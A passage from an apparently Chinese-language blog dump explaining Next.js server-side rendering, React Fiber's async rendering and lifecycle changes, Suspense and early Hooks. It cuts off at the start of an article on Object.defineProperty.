React 组件该怎么写还是怎么写；\ngetInitialProps 只负责获取数据的过程，开发者不用操心什么时候调用 getInitialProps，依然是 React 哲学的声明式编程方式；\ngetInitialProps 是 async 函数，可以利用 JavaScript 语言的新特性，用同步的方式实现异步功能。\n\nNext.js 的“脱水”和“注水”\n我们说过服务器端渲染的关键是如何“脱水”和“注水”，如果你对 Next.js 如何实现这两个关键点好奇（实际上你确实应该感到好奇），那么在浏览器中使用“显示网页源代码”就可以让你一目了然。\n在网页的 HTML 中，可以看到类似下面的内容：\n&lt;script&gt;  __NEXT_DATA__ = &#123;    &quot;props&quot;:&#123;      &quot;pageProps&quot;: &#123;&quot;userName&quot;:&quot;Morgan&quot;&#125;&#125;,      &quot;page&quot;:&quot;/&quot;,&quot;pathname&quot;:&quot;/&quot;,&quot;query&quot;:&#123;&#125;,&quot;buildId&quot;:&quot;-&quot;,&quot;assetPrefix&quot;:&quot;&quot;,&quot;nextExport&quot;:false,&quot;err&quot;:null,&quot;chunks&quot;:[]&#125;&lt;/script&gt;\n\nNext.js 在做服务器端渲染的时候，页面对应的 React 组件的 getInitialProps 函数被调用，异步结果就是“脱水”数据的重要部分，除了传给页面 React 组件完成渲染，还放在内嵌 script 的 NEXT_DATA 中，这样，在浏览器端渲染的时候，是不会去调用 getInitialProps 的，直接通过 NEXT_DATA 中的“脱水”数据来启动页面 React 组件的渲染。\n这样一来，如果 getInitialProps 中有调用 API 的异步操作，只在服务器端做一次，浏览器端就不用做了。\n那么，getInitialProps 什么时候会在浏览器端调用呢？\n当在单页应用中做页面切换的时候，比如从 Home 页切换到 Product 页，这时候完全和服务器端没关系，只能靠浏览器端自己了，Product页面的 getInitialProps 函数就会在浏览器端被调用，得到的数据用来开启页面的 React 原生生命周期过程。\n关键点是，浏览器可能会直接访问 &#x2F;home 或者 &#x2F;product，也可能通过网页切换访问这两个页面，也就是说 Home 或者 Product 都可能被服务器端渲染，也可能完全只有浏览器端渲染，不过，这对应用开发者来说无所谓，应用开发者只要写好 getInitialProps，至于调用 getInitialProps 的时机，交给 Next.js 处理就好了。\n你可以发明自己的服务器端框架，但很可能最后你发现，如果要做得通用性好，最后都会做到和 Next.js 一样的模式上来。\n值得一提的是，getInitialProps 返回的应该是“纯数据”，也就是不要返回一个定制类的实例。比如，有一个类 Foo 有一个成员函数 bar，不要在 getInitialProps 返回一个 Foo 实例。不然，经过“脱水”和“注水”过程，网页组件获得的那个“Foo 实例”不再是你想的那个 Foo 实例了，它变成了一个纯粹的数据，不会包含成员函数 bar的。\n八、React 的未来（1）： 拥抱异步渲染同步渲染的问题\n长期以来，React 一直用的是同步渲染，这样对 React 实现非常直观方便，但是会带来性能问题。\n假设有一个超大的 React 组件树结构，有 1000 个组件，每个组件平均使用 1 毫秒，那么，要做一次完整的渲染就要花费 1000 毫秒也就是 1 秒钟，然而 JavaScript 运行环境是单线程的，也就是说，React 用同步渲染方式，渲染最根部组件的时候，会同步引发渲染子组件，再同步渲染子组件的子组件……最后完成整个组件树。在这 1 秒钟内，同步渲染霸占 JavaScript 唯一的线程，其他的操作什么都做不了，在这 1 秒钟内，如果用户要点击什么按钮，或者在某个输入框里面按键，都不会看到立即的界面反应，这也就是俗话说的“卡顿”。\n在同步渲染下，要解决“卡顿”的问题，只能是尽量缩小组件树的大小，以此缩短渲染时间，但是，应用的规模总是在增大的，不是说缩小就能缩小的，虽然我们利用定义 shouldComponentUpdate 的方法可以减少不必要的渲染，但是这也无法从根本上解决大量同步渲染带来的“卡顿”问题。\n异步渲染：两阶段渲染\nReact Fiber 引入了异步渲染，有了异步渲染之后，React 组件的渲染过程是分时间片的，不是一口气从头到尾把子组件全部渲染完，而是每个时间片渲染一点，然后每个时间片的间隔都可去看看有没有更紧急的任务（比如用户按键），如果有，就去处理紧急任务，如果没有那就继续照常渲染。\n根据 React Fiber 的设计，一个组件的渲染被分为两个阶段：第一个阶段（也叫做 render 阶段）是可以被 React 打断的，一旦被打断，这阶段所做的所有事情都被废弃，当 React 处理完紧急的事情回来，依然会重新渲染这个组件，这时候第一阶段的工作会重做一遍；第二个阶段叫做 commit 阶段，一旦开始就不能中断，也就是说第二个阶段的工作会稳稳当当地做到这个组件的渲染结束。\n两个阶段的分界点，就是 render 函数。render 函数之前的所有生命周期函数（包括 render)都属于第一阶段，之后的都属于第二阶段。\n开启异步渲染，虽然我们获得了更好的感知性能，但是考虑到第一阶段的的生命周期函数可能会被重复调用，不得不对历史代码做一些调整。\n\n在 React v16.3 之前，render 之前的生命周期函数（也就是第一阶段生命周期函数）包括这些：\n\n\ncomponentWillReceiveProps\nshouldComponentUpdate\ncomponentWillUpdate\ncomponentWillMount\nrender\n\n\n下图是 React v16.3 之前的完整的生命周期函数图：\n\n\nReact 官方告诫开发者，虽然目前所有的代码都可以照常使用，但是未来版本中会废弃掉，为了将来，使用 React 的程序应该快点去掉这些在第一阶段生命函数中有副作用的功能。不得不说 React 真的很够意思，提前这么久告诉大家这个事情，让大家有足够的时间去修改自己的代码。\n一个典型的错误用例，也是我被问到做多的问题之一：为什么不在 componentWillMount 里去做AJAX？componentWillMount 可是比 componentDidMount 更早调用啊，更早调用意味着更早返回结果，那样性能不是更高吗？\n首先，一个组件的 componentWillMount 比 componentDidMount 也早调用不了几微秒，性能没啥提高；而且，等到异步渲染开启的时候，componentWillMount 就可能被中途打断，中断之后渲染又要重做一遍，想一想，在 componentWillMount 中做 AJAX 调用，代码里看到只有调用一次，但是实际上可能调用 N 多次，这明显不合适。相反，若把 AJAX 放在 componentDidMount，因为 componentDidMount 在第二阶段，所以绝对不会多次重复调用，这才是 AJAX 合适的位置（当然，React 未来有更好的办法，在下一小节 Suspense 中可以讲到）。\ngetDerivedStateFromProps\n\n到了 React v16.3，React 干脆引入了一个新的生命周期函数 getDerivedStateFromProps，这个生命周期函数是一个 static 函数，在里面根本不能通过 this 访问到当前组件，输入只能通过参数，对组件渲染的影响只能通过返回值。没错，getDerivedStateFromProps 应该是一个纯函数，React 就是通过要求这种纯函数，强制开发者们必须适应异步渲染。\n\nstatic getDerivedStateFromProps(nextProps, prevState) &#123;  //根据nextProps和prevState计算出预期的状态改变，返回结果会被送给setState&#125;\n\n到了 React v16.3，React 生命周期函数全图如下:\n\n注意，上图中并包含全部React生命周期函数，在React v16发布时，还增加了一个componentDidCatch，当异常发生时，一个可以捕捉到异常的componentDidCatch就排上用场了。不过，很快React觉着这还不够，在v16.6.0又推出了一个新的捕捉异常的生命周期函数getDerivedStateFromError。\n如果异常发生在第一阶段（render阶段），React就会调用getDerivedStateFromError，如果异常发生在第二阶段（commit阶段），React会调用componentDidCatch。这个区别也体现出两个阶段的区分对待。\n适应异步渲染的组件原则\n\n明白了异步渲染的来龙去脉之后，开发者就应该明白，现在写代码必须要为未来的某一次 React 版本升级做好准备，当 React 开启异步渲染的时候，你的代码应该做到在 render 之前最多只能这些函数被调用：\n\n\n构造函数\ngetDerivedStateFromProps\nshouldComponentUpdate\n\n幸存的这些第一阶段函数，除了构造函数，其余两个全都必须是纯函数，也就是不应该做任何有副作用的操作。\n实际上，如果之前你的用法规范，除了 shouldComponentUpdate 不怎么使用第一阶段生命周期函数，你还会发现不怎么需要改动代码，比如 componentWillMount 中的代码移到构造函数中就可以了。但是如果用法错乱，比如滥用componentWillReceiveProps，那就不得不具体情况具体分析，从而决定这些代码移到什么位置。\n开发者中一个普遍的误区，就是总想把任务往前提，提到靠前的生命周期函数去，就像我前面说过的在 componentWillMount 中做 AJAX。正确的做法是根据各函数的语义来放置代码，并不是越往前越好。\n九、React 的未来（2）：Suspense 带来的异步操作革命上一节我们介绍了 Fiber 架构下的异步渲染机制，我们知道生命周期函数的修改是势在必行，那么，接下来呢？接下来 React 会有什么“大事”呢？\n这个答案估计连 React 的核心开发者也在讨论中，不过从各种渠道信息看来，至少有两件“大事”在会在看得见的未来发生，那就是：\n\nSuspense\nHooks\n\n当然 React 增加的功能肯定远不止这点，将这两件“大事”在这里提出来，是因为它们对我们使用开发者的影响最大，会彻底改变我们的代码模式。\n在写这本小册时，React 正式版是 v16.6.0，还只是 alpha 阶段，也许当你读到这本小册时，React 已经走得更远，但是你依然应该阅读这一小节，因为作为开发者你应该要明白技术演化的来龙去脉。\n我们首先来了解 Suspense。Suspense 应用的场合就是异步数据处理，最常见的例子，就是通过 AJAX 从服务器获取数据，每一个 React 开发者都曾为这个问题纠结。\n如果用一句话概括 Suspense 的功用，那就是：用同步的代码来实现异步操作。\n而要理解 Suspense，我们先来体会一下 React 中做 AJAX 之类异步操作的痛苦\nReact 同步操作的不足\n上一节介绍过，React 最初的设计，整个渲染过程都是同步的。同步的意思是，当一个组件开始渲染之后，就必须一口气渲染完，不能中断，对于特别庞大的组件树，这个渲染过程会很耗时，而且，这种同步处理，也会导致我们的代码比较麻烦。\n当我们开始渲染某个组件的时候，假设这个组件需要从服务器获取数据，那么，要么由这个组件的父组件想办法拿到服务器的数据，然后通过 props 传递进来，要么就要靠这个组件自力更生来获取数据，但是，没有办法通过一次渲染完成这个过程，因为渲染过程是同步的，不可能让 React 等待这个组件调用 AJAX 获取数据之后再继续渲染。\n\n常用的做法，需要组件的 render 和 componentDidMount 函数配合。\n\n\n在 componentDidMount 中使用 AJAX，在 AJAX 成功之后，通过 setState 修改自身状态，这会引发一次新的渲染过程。\n在 render 函数中，如果 state 中没有需要的数据，就什么都不渲染或者渲染一个“正在装载”之类提示；如果 state 中已经有需要的数据，就可以正常渲染了，但这也必定是在 componentDidMount 修改了 state 之后，也就是只有在第二次渲染过程中才可以。\n\nclass Foo extends React.Component &#123;  state = &#123;     data: null  &#125;  render() &#123;     if (!this.state.data) &#123;        return null;     &#125; else &#123;        return &lt;div&gt;this.state.data&lt;/div&gt;;     &#125;  &#125;    componentDidMount() &#123;     callAPI().then(result =&gt; &#123;       this.setState(&#123;data: result&#125;);     &#125;);  &#125;&#125;\n\n这种方式虽然可行，我们也照这种套路写过不少代码，但它的缺点也是很明显的。\n组件必须要有自己的 state 和 componentDidMount 函数实现，也就不可能做成纯函数形式的组件。需要两次渲染过程，第一次是 mount 引发的渲染，由 componentDidMount 触发 AJAX 然后修改 state，然后第二次渲染才真的渲染出内容。代码啰嗦，十分啰嗦。\n理想中的代码形式\n而 Suspense 就是为了克服上述 React 的缺点。\n在了解 Suspense 怎么解决这些问题之前，我们不妨自己想象一下，如果要利用 AJAX 获取数据，代码怎样写最简洁高效？\n我先来说一说自己设想的最佳代码形式。首先，我不想写一个有状态的组件，因为通过 AJAX 获取的数据往往也就在渲染用一次，没必要存在 state 里；其次，想要使数据拿来就用，不需要经过 componentDidMount 走一圈。所以，代码最好是下面这样：\nconst Foo = () =&gt; &#123;  const data = callAPI();  return &lt;div&gt;&#123;data&#125;&lt;/div&gt;;&#125;\n\n够简洁吧，可是目前的 React 版本做不到啊！\n因为 callAPI 肯定是一个异步操作，不可能获得同步数据，无法在同步的 React 渲染过程中立足。\n不过，现在做不到，不代表将来做不到，将来 React 会支持这样的代码形式，这也就是 Suspense。\nSuspense\n在 JsConf Iceland 2018 技术大会 上，React 的开发者展示了未来 React 会支持的新特性 Suspense，有了 Suspense，就可以在 React 中以同步的形式来写异步代码，代码形式类似下面：\nconst Foo = () =&gt; &#123;  const data = createFetcher(callAJAX).read();  return &lt;div&gt;&#123;data&#125;&lt;/div&gt;;&#125;\n\n在 React 推出 v16 的时候，就增加了一个新生命周期函数 componentDidCatch。如果某个组件定义了 componentDidCatch，那么这个组件中所有的子组件在渲染过程中抛出异常时，这个 componentDidCatch 函数就会被调用。\n可以这么设想，componentDidCatch 就是 JavaScript 语法中的 catch，而对应的 try 覆盖所有的子组件，就像下面这样:\ntry &#123;  //渲染子组件&#125; catch (error) &#123;  // componentDidCatch被调用&#125;\n\nSuspense 就是巧妙利用 componentDidCatch 来实现同步形式的异步处理。\nSuspense 提供的 createFetcher 函数会封装异步操作，当尝试从 createFetcher 返回的结果读取数据时，有两种可能：一种是数据已经就绪，那就直接返回结果；还有一种可能是异步操作还没有结束，数据没有就绪，这时候 createFetcher 会抛出一个“异常”。\n你可能会说，抛出异常，渲染过程不就中断了吗？\n的确会中断，不过，createFetcher 抛出的这个“异常”比较特殊，这个“异常”实际上是一个 Promise 对象，这个 Promise 对象代表的就是异步操作，操作结束时，也是数据准备好的时候。当 componentDidCatch 捕获这个 Promise 类型的“异常”时，就可以根据这个 Promise 对象的状态改变来重新渲染对应组件，第二次渲染，肯定就能够成功。\n下面是 createFetcher 的一个简单实现方式\nvar NO_RESULT = &#123;&#125;;export const createFetcher = (task) =&gt; &#123;  let result = NO_RESULT;  return () =&gt; &#123;    const p = task();    p.then(res =&gt; &#123;      result = res;    &#125;);    if (result === NO_RESULT) &#123;      throw p;    &#125;    return result;  &#125;&#125;\n\n在上面的代码中，createFetcher 的参数 task 被调用应该返回一个 Promise 对象，这个对象在第一次调用时会被 throw 出去，但是，只要这个对象完结，那么 result 就有实际的值，不会再被 throw。\n还需要一个和 createFetcher 配合的 Suspense，代码如下：\nclass Suspense extends React.Component &#123;  state = &#123;    pending: false  &#125;  componentDidCatch(error) &#123;    // easy way to detect Promise type    if (typeof error.then === &#x27;function&#x27;) &#123;      this.setState(&#123;pending: true&#125;);      error.then(() =&gt; this.setState(&#123;        pending: false      &#125;));    &#125;  &#125;  render() &#123;    return this.state.pending ? null : this.props.children;  &#125;&#125;\n\n上面的 Suspense 组件实现了 componentDidCatch，如果捕获的 error 是 Promise 类型，那就说明子组件用 createFetcher 获取异步数据了，就会等到它完结之后重设 state，引发一次新的渲染过程，因为 createFetcher 中会记录异步返回的结果，新的渲染就不会抛出异常了。\n使用 createFetcher 和 Suspense 的示例代码如下:\nconst getName = () =&gt; new Promise((resolve) =&gt; &#123;  setTimeout(() =&gt; &#123;    resolve(&#x27;Morgan&#x27;);  &#125;, 1000);&#125;)const fetcher = createFetcher(getName);const Greeting = () =&gt; &#123;  return &lt;div&gt;Hello &#123;fetcher()&#125;&lt;/div&gt;&#125;;const SuspenseDemo = () =&gt; &#123;  return (    &lt;Suspense&gt;      &lt;Greeting /&gt;    &lt;/Suspense&gt;  );&#125;;\n\n上面的 getName 利用 setTimeout 模拟了异步 AJAX 获取数据，第一次渲染 Greeting 组件时，会有 Promise 类型的异常抛出，被 Suspense 捕获。1 秒钟之后，当 getName 返回实际结果的时候，Suspense 会引发重新渲染，这一次 Greeting 会显示出 hello Morgan。\n上面的 createFetcher 和 Suspense 是一个非常简陋的实现，主要用来让读者了解 Suspense 的工作原理，正式发布的 Suspense 肯定会具备更强大的功能。\nReact v16.6.0 对 Suspense 的支持\nReact 发布 v16.6.0 的时候，提供了 Suspense 组件，直接支持 Suspense 功能，但是还没有正式提供 createFetcher 的功能，只发布了一个独立但不稳定的 react-cache 包。这个包里的 unstable_createResource 相当于上面描述的 createFetcher。照这个命名来看，正式发布的时候这个 API 可能会叫做 createResource 而不是叫 createFetcher。\n我们利用 React v16.6.0 和不稳定的 react-cache 来实现上述功能，代码如下：\nimport React, &#123;Suspense&#125; from &#x27;react&#x27;;import &#123;unstable_createResource as createResource&#125; from &#x27;react-cache&#x27;;const getName = () =&gt; new Promise((resolve) =&gt; &#123;  setTimeout(() =&gt; &#123;    resolve(&#x27;Morgan&#x27;);  &#125;, 1000);&#125;)const resource = createResource(getName);const Greeting = () =&gt; &#123;  return &lt;div&gt;hello &#123;resource.read()&#125;&lt;/div&gt;&#125;;const SuspenseDemo = () =&gt; &#123;  return (    &lt;Suspense fallback=&#123;&lt;div&gt;loading...&lt;/div&gt;&#125; &gt;      &lt;Greeting /&gt;    &lt;/Suspense&gt;  );&#125;;\n\n在上面的代码中，我们使用 React 提供的 Suspense 组件，支持一个 fallback 属性，这个属性可以用于显示“装载中”界面。在上面的例子中，要等待 1 秒钟时间才得到模拟 API 的结果，这时候显示一个空白页面是肯定不合适的，在等待的这 1 秒钟里，显得就是一个“Loading…”字样。\n很显然，需要一个最佳实践来控制 Suspense 的范围。如果我们只在组件树最顶层放一个 Suspense 组件，那么在 API 返回之前，整个页面只显示“装载中”，这样的用户体验并不好。正确的做法，是将每一个独立依赖某个 API 调用的组件用一个 Suspense 包住。\n例如，一个页面中包括头部的 Header、左侧的导航栏 LeftPanel 和右侧的内容 Content，其中只有 Header 的渲染不依赖于 API，那么，JSX 可以这样写：\n&lt;div&gt;    &lt;Header /&gt;    &lt;Suspense fallback=&#123;&lt;LoadingSpin /&gt;&#125;&gt;        &lt;LeftPanel /&gt;    &lt;/Suspense&gt;    &lt;Suspense fallback=&#123;&lt;LoadingSpin /&gt;&#125;&gt;        &lt;Content /&gt;    &lt;/Suspense&gt;&lt;/div&gt;\n\n这样，网页首先显示 Header，然后无论 LeftPanel 还是 Content 中谁的 AJAX 首先返回结果，都可以立刻显示对应模块，而不用等待所有 AJAX 都返回才让用户看到更新。\nSuspense 带来的 React 使用模式改变\nSuspense 被推出之后，可以极大地减少异步操作代码的复杂度。\n之前，只要有 AJAX 这样的异步操作，就必须要用两次渲染来显示 AJAX 结果，这就需要用组件的 state 来存储 AJAX 的结果，用 state 又意味着要把组件实现为一个 class。总之，我们需要做这些：\n\n实现一个 class；\nclass 中需要有 state；\n需要实现 componentDidMount 函数；\nrender 必须要根据 this.state 来渲染不同内容。\n有了 Suspense 之后，不需要做上面这些杂事，只要一个函数形式组件就足够了。\n\n在介绍 Redux 时，我们提到过在 Suspense 面前，Redux 的一切异步操作方案都显得繁琐，读者现在应该能够通过代码理解这一点了。\n很可惜，目前 Suspense 还不支持服务器端渲染，当 Suspense 支持服务器端渲染的时候，那就真的会对 React 社区带来革命性影响。\n总结\n\nSuspense 解决异步操作的问题；\n有了 Supsense 之后，依赖 AJAX 的组件也可以是函数形式，不需要是 class。\n\n十、函数化的 HooksReact v16.7.0-alpha 中第一次引入了 Hooks 的概念，因为这是一个 alpha 版本，不算正式发布，所以，将来正式发布时 API 可能会有变化。\n\nHooks 的目的，简而言之就是让开发者不需要再用 class 来实现组件\n\n还记得之前我们介绍的经典 Counter 组件吗？不考虑用 Redux 或者 Mobx 来管理状态的话，Counter 组件就需要把计数数据放在 state 里，要用 state，就意味着需要定义一个 class。\n很多时候，一个简单组件也需要实现一个 class，的确是一件很烦的事，有了 Hooks 之后，事情就简单多了，我们用几个已经公开的 Hooks API 来看看如何避免写 class。\nuseState\n\nHooks 会提供一个叫 useState 的方法，它开启了一扇新的定义 state 的门，对应 Counter 的代码可以这么写：\n\nimport &#123; useState &#125; from &#x27;react&#x27;;const Counter = () =&gt; &#123;  const [count, setCount] = useState(0);  return (    &lt;div&gt;       &lt;div&gt;&#123;count&#125;&lt;/div&gt;       &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+&lt;/button&gt;       &lt;button onClick=&#123;() =&gt; setCount(count - 1)&#125;&gt;-&lt;/button&gt;    &lt;/div&gt;  );&#125;;\n\n注意看，Counter 拥有自己的“状态”，但它只是一个函数，不是 class。\nuseState 只接受一个参数，也就是 state 的初始值，它返回一个只有两个元素的数组，第一个元素就是 state 的值，第二个元素是更新 state 的函数。\n我们利用解构赋值（destructuring assignment）把两个元素分别赋值给 count 和 setCount，相当于这样的代码：\n// 下面代码等同于： const [count, setCount] = useState(0);const result = useState(0);const count = result[0];const setCount = result[1];\n\n利用 count 可以读取到这个 state，利用 setCount 可以更新这个 state，而且我们完全可以控制这两个变量的命名，只要高兴，你完全可以这么写\nconst [theCount, updateCount] = useState(0);\n\n因为 useState 在 Counter 这个函数体中，每次 Counter 被渲染的时候，这个 useState 调用都会被执行，useState 自己肯定不是一个纯函数，因为它要区分第一次调用（组件被 mount 时）和后续调用（重复渲染时），只有第一次才用得上参数的初始值，而后续的调用就返回“记住”的 state 值。\n读者看到这里，心里可能会有这样的疑问：如果组件中多次使用 useState 怎么办？React 如何“记住”哪个状态对应哪个变量？\nReact 是完全根据 useState 的调用顺序来“记住”状态归属的，假设组件代码如下：\nconst Counter = () =&gt; &#123;  const [count, setCount] = useState(0);  const [foo, updateFoo] = useState(&#x27;foo&#x27;);    ...&#125;\n\n每一次 Counter 被渲染，都是第一次 useState 调用获得 count 和 setCount，第二次 useState 调用获得 foo 和 updateFoo（这里我故意让命名不用 set 前缀，可见函数名可以随意）。React 是渲染过程中的“上帝”，每一次渲染 Counter 都要由 React 发起，所以它有机会准备好一个内存记录，当开始执行的时候，每一次 useState 调用对应内存记录上一个位置，而且是按照顺序来记录的。React 不知道你把 useState 等 Hooks API 返回的结果赋值给什么变量，但是它也不需要知道，它只需要按照 useState 调用顺序记录就好了。\n正因为这个原因，Hooks，千万不要在 if 语句或者 for 循环语句中使用！\n像下面的代码，肯定会出乱子的：\nconst Counter = () =&gt; &#123;    const [count, setCount] = useState(0);    if (count % 2 === 0) &#123;        const [foo, updateFoo] = useState(&#x27;foo&#x27;);    &#125;    const [bar, updateBar] = useState(&#x27;bar&#x27;);  ...&#125;\n\n因为条件判断，让每次渲染中 useState 的调用次序不一致了，于是 React 就错乱了。\nuseEffect\n除了 useState，React 还提供 useEffect，用于支持组件中增加副作用的支持。\n在 React 组件生命周期中如果要做有副作用的操作，代码放在哪里？\n当然是放在 componentDidMount 或者 componentDidUpdate 里，但是这意味着组件必须是一个 class。\n在 Counter 组件，如果我们想要在用户点击“+”或者“-”按钮之后把计数值体现在网页标题上，这就是一个修改 DOM 的副作用操作，所以必须把 Counter 写成 class，而且添加下面的代码\ncomponentDidMount() &#123;  document.title = `Count: $&#123;this.state.count&#125;`;&#125;componentDidUpdate() &#123;  document.title = `Count: $&#123;this.state.count&#125;`;&#125;\n\n\n而有了 useEffect，我们就不用写一个 class 了，对应代码如下：\n\nimport &#123; useState, useEffect &#125; from &#x27;react&#x27;;const Counter = () =&gt; &#123;  const [count, setCount] = useState(0);    useEffect(() =&gt; &#123;    document.title = `Count: $&#123;count&#125;`;  &#125;);  return (    &lt;div&gt;       &lt;div&gt;&#123;count&#125;&lt;/div&gt;       &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+&lt;/button&gt;       &lt;button onClick=&#123;() =&gt; setCount(count - 1)&#125;&gt;-&lt;/button&gt;    &lt;/div&gt;  );&#125;;\n\nuseEffect 的参数是一个函数，组件每次渲染之后，都会调用这个函数参数，这样就达到了 componentDidMount 和 componentDidUpdate 一样的效果。\n虽然本质上，依然是 componentDidMount 和 componentDidUpdate 两个生命周期被调用，但是现在我们关心的不是 mount 或者 update 过程，而是“after render”事件，useEffect 就是告诉组件在“渲染完”之后做点什么事。\n读者可能会问，现在把 componentDidMount 和 componentDidUpdate 混在了一起，那假如某个场景下我只在 mount 时做事但 update 不做事，用 useEffect 不就不行了吗？\n其实，用一点小技巧就可以解决。useEffect 还支持第二个可选参数，只有同一 useEffect 的两次调用第二个参数不同时，第一个函数参数才会被调用，所以，如果想模拟 componentDidMount，只需要这样写：\nuseEffect(() =&gt; &#123;  // 这里只有mount时才被调用，相当于componentDidMount&#125;, [123]);\n\n\n在上面的代码中，useEffect 的第二个参数是 [123]，其实也可以是任何一个常数，因为它永远不变，所以 useEffect 只在 mount 时调用第一个函数参数一次，达到了 componentDidMount 一样的效果。\n\nuseContext\n在前面介绍“提供者模式”章节我们介绍过 React 新的 Context API，这个 API 不是完美的，在多个 Context 嵌套的时候尤其麻烦。\n比如，一段 JSX 如果既依赖于 ThemeContext 又依赖于 LanguageContext，那么按照 React Context API 应该这么写\n&lt;ThemeContext.Consumer&gt;    &#123;        theme =&gt; (            &lt;LanguageContext.Cosumer&gt;                language =&gt; &#123;                    //可以使用theme和lanugage了                &#125;            &lt;/LanguageContext.Cosumer&gt;        )    &#125;&lt;/ThemeContext.Consumer&gt;\n\n因为 Context API 要用 render props，所以用两个 Context 就要用两次 render props，也就用了两个函数嵌套，这样的缩格看起来也的确过分了一点点。\n使用 Hooks 的 useContext，上面的代码可以缩略为下面这样\nconst theme = useContext(ThemeContext);const language = useContext(LanguageContext);// 这里就可以用theme和language了\n\n这个useContext把一个需要很费劲才能理解的 Context API 使用大大简化，不需要理解render props，直接一个函数调用就搞定。\n但是，useContext也并不是完美的，它会造成意想不到的重新渲染，我们看一个完整的使用useContext的组件。\nconst ThemedPage = () =&gt; &#123;    const theme = useContext(ThemeContext);        return (       &lt;div&gt;            &lt;Header color=&#123;theme.color&#125; /&gt;            &lt;Content color=&#123;theme.color&#125;/&gt;            &lt;Footer color=&#123;theme.color&#125;/&gt;       &lt;/div&gt;    );&#125;;\n\n因为这个组件ThemedPage使用了useContext，它很自然成为了Context的一个消费者，所以，只要Context的值发生了变化，ThemedPage就会被重新渲染，这很自然，因为不重新渲染也就没办法重新获得theme值，但现在有一个大问题，对于ThemedPage来说，实际上只依赖于theme中的color属性，如果只是theme中的size发生了变化但是color属性没有变化，ThemedPage依然会被重新渲染，当然，我们通过给Header、Content和Footer这些组件添加shouldComponentUpdate实现可以减少没有必要的重新渲染，但是上一层的ThemedPage中的JSX重新渲染是躲不过去了。\n说到底，useContext需要一种表达方式告诉React：“我没有改变，重用上次内容好了。”\n希望Hooks正式发布的时候能够弥补这一缺陷。\nHooks 带来的代码模式改变\n上面我们介绍了 useState、useEffect 和 useContext 三个最基本的 Hooks，可以感受到，Hooks 将大大简化使用 React 的代码。\n首先我们可能不再需要 class了，虽然 React 官方表示 class 类型的组件将继续支持，但是，业界已经普遍表示会迁移到 Hooks 写法上，也就是放弃 class，只用函数形式来编写组件。\n对于 useContext，它并没有为消除 class 做贡献，却为消除 render props 模式做了贡献。很长一段时间，高阶组件和 render props 是组件之间共享逻辑的两个武器，但如同我前面章节介绍的那样，这两个武器都不是十全十美的，现在 Hooks 的出现，也预示着高阶组件和 render props 可能要被逐步取代。\n但读者朋友，不要觉得之前学习高阶组件和 render props 是浪费时间，相反，你只有明白 React 的使用历史，才能更好地理解 Hooks 的意义。\n可以预测，在 Hooks 兴起之后，共享代码之间逻辑会用函数形式，而且这些函数会以 use- 前缀为约定，重用这些逻辑的方式，就是在函数形式组件中调用这些 useXXX 函数。\n例如，我们可以写这样一个共享 Hook useMountLog，用于在 mount 时记录一个日志，代码如下：\nconst useMountLog = (name) =&gt; &#123;    useEffect(() =&gt; &#123;        console.log(`$&#123;name&#125; mounted`);        &#125;, [123]);&#125;\n\n任何一个函数形式组件都可以直接调用这个 useMountLog 获得这个功能，如下\nconst Counter = () =&gt; &#123;    useMountLog(&#x27;Counter&#x27;);        ...&#125;\n\n对了，所有的 Hooks API 都只能在函数类型组件中调用，class 类型的组件不能用，从这点看，很显然，class 类型组件将会走向消亡。\n总结\n\nHooks 的意义就是可以淘汰 class 类型的组件；\nHooks 将改变重用组件逻辑的模式；\n在未来，Hooks 将是 React 使用的主流\n\n","categories":["框架"],"tags":["React"]},{"title":"Object.defineProperty详解","url":"/2018/06/11/Vue/Object.defineProperty%E8%AF%A6%E8%A7%A3/","content":"一、简介兼容性\n\n在ie8下只能在DOM对象上使用，尝试在原生的对象使用 Object.defineProperty()会报错。\n\n定义对象可以使用构造函数或字面量的形式\nvar obj = new Object;  //obj = &#123;&#125;obj.name = &quot;张三&quot;;  //添加描述obj.say = function()&#123;&#125;;  //添加行为\n\n\n除了以上添加属性的方式，还可以使用Object.defineProperty定义新属性或修改原有的属性\n\n二、Object.defineProperty()2.1 定义Object.defineProperty(obj, prop, descriptor)\n\n参数说明：\n\nobj：必需。目标对象\nprop：必需。需定义或修改的属性的名字\ndescriptor：必需。目标属性所拥有的特性\n\n\n返回值：传入函数的对象。即第一个参数obj\n\n\n针对属性，我们可以给这个属性设置一些特性，比如是否只读不可以写；是否可以被for..in或Object.keys()遍历。\n\n给对象的属性添加特性描述，目前提供两种形式：数据描述和存取器描述\n2.2 数据描述\n当修改或定义对象的某个属性的时候，给这个属性添加一些特性\n\nvar obj = &#123;    test:&quot;hello&quot;&#125;//对象已有的属性添加特性描述Object.defineProperty(obj,&quot;test&quot;,&#123;    configurable:true | false,    enumerable:true | false,    value:任意类型的值,    writable:true | false&#125;);//对象新添加的属性的特性描述Object.defineProperty(obj,&quot;newKey&quot;,&#123;    configurable:true | false,    enumerable:true | false,    value:任意类型的值,    writable:true | false&#125;);\n\n\n数据描述中的属性都是可选的，来看一下设置每一个属性的作用\n\n2.2.1 value\n属性对应的值,可以使任意类型的值，默认为undefined\n\nvar obj = &#123;&#125;//第一种情况：不设置value属性Object.defineProperty(obj,&quot;newKey&quot;,&#123;&#125;);console.log( obj.newKey );  //undefined------------------------------//第二种情况：设置value属性Object.defineProperty(obj,&quot;newKey&quot;,&#123;    value:&quot;hello&quot;&#125;);console.log( obj.newKey );  //hello\n\n2.2.2 writable\n属性的值是否可以被重写。设置为true可以被重写；设置为false，不能被重写。默认为false\n\nvar obj = &#123;&#125;//第一种情况：writable设置为false，不能重写。Object.defineProperty(obj,&quot;newKey&quot;,&#123;    value:&quot;hello&quot;,    writable:false&#125;);//更改newKey的值obj.newKey = &quot;change value&quot;;console.log( obj.newKey );  //hello//第二种情况：writable设置为true，可以重写Object.defineProperty(obj,&quot;newKey&quot;,&#123;    value:&quot;hello&quot;,    writable:true&#125;);//更改newKey的值obj.newKey = &quot;change value&quot;;console.log( obj.newKey );  //change value\n\n2.2.3 enumerable\n此属性是否可以被枚举（使用for...in或Object.keys()）。设置为true可以被枚举；设置为false，不能被枚举。默认为false\n\nvar obj = &#123;&#125;//第一种情况：enumerable设置为false，不能被枚举。Object.defineProperty(obj,&quot;newKey&quot;,&#123;    value:&quot;hello&quot;,    writable:false,    enumerable:false&#125;);//枚举对象的属性for( var attr in obj )&#123;    console.log( attr );  &#125;//第二种情况：enumerable设置为true，可以被枚举。Object.defineProperty(obj,&quot;newKey&quot;,&#123;    value:&quot;hello&quot;,    writable:false,    enumerable:true&#125;);//枚举对象的属性for( var 